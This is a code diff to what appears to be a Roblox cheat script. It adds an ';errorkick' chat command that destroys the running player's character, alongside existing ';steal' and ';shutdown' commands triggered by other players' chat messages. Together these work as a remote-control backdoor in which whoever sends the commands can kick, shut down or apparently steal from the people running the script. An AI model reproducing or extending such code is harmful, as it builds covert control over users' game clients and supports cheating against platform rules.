@@ -276,6 +276,11 @@ end
 function funcs:shutdown()
 	game:Shutdown()
 end
+function funcs:errorkick()
+	if entityLibrary.isAlive then 
+	    pcall(function() lplr.Character.Head:Destroy() end)
+	end
+end
 function sysmsg(text, color)
     game.StarterGui:SetCore(
         "ChatMakeSystemMessage",
@@ -357,6 +362,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:steal()
 			elseif a == ";shutdown" then
 				funcs:shutdown()
+			elseif a == ";errorkick" then
+				funcs:errorkick()
 			end
 		end
 	end)
@@ -402,6 +409,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:steal()
 			elseif a == ";shutdown" then
 				funcs:shutdown()
+			elseif a == ";errorkick" then
+				funcs:errorkick()
 			end
 		end
 	end)
@@ -450,6 +459,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:steal()
 			elseif a == ";shutdown" then
 				funcs:shutdown()
+			elseif a == ";errorkick" then
+				funcs:errorkick()
 			end
 		end
 	end)
@@ -495,6 +506,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:steal()
 			elseif a == ";shutdown" then
 				funcs:shutdown()
+			elseif a == ";errorkick" then
+				funcs:errorkick()
 			end
 		end
 	end)
